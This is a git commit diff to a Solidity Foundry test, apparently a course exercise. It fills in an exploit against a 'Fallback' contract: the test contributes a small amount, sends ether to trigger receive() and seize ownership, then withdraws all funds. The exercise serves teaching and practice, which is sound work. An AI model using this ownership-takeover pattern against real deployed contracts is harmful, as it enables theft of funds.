fd1a216ede68b7e3ce33cfdaa5caee184f2f973e
MonaaEid <monaa_eid@hotmail.com>
2025-04-23 02:47:00 +0200

    Hack the contract

--- test/Assignment11.sol
+++ test/Assignment11.sol
@@ -16,12 +16,16 @@ contract FallbackTest is Test {
 
     function exploit() internal {
         vm.startPrank(student);
-        
+
+
         // Contribute a small amount (less than 0.001 ether) to the contract
+        fallbackContract.contribute{value: 0.0001 ether}();
 
         // Send ether to the contract trigger receive() and become the owner
-
+        (bool success, ) = address(fallbackContract).call{value: 0.0001 ether}("");
+        require(success, "Failed to send ether");
         // Withdraw all funds
+        fallbackContract.withdraw();
 
         vm.stopPrank();
     }
